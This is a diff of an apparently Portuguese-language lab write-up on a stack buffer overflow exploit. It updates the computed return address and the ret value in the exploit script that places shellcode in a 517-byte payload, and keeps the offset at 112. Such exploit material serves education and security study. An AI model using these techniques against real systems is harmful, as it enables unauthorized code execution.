@@ -94,8 +94,8 @@ start = 517 - len(shellcode)
 </div>
 
 ```Python
-ret = 0xffffca68 + 110 = 0xffffcad6
-offset = 0xffffca68 - 0xffffc9fc + 4 = 112
+ret = 0xffffca18 + 300 = 0xffffcb44
+offset = 0xffffca18 - 0xffffc9ac + 4 = 112
 ```
 
 <p> Com isto, o código final ficou da seguinte forma:</p>
@@ -129,7 +129,7 @@ content[start:start + len(shellcode)] = shellcode
 
 # and put it somewhere in the payload
 
-ret = 0xffffcad6           # Change this number 
+ret = 0xffffca18 + 300           # Change this number 
 
 offset = 112              # Change this number 
 
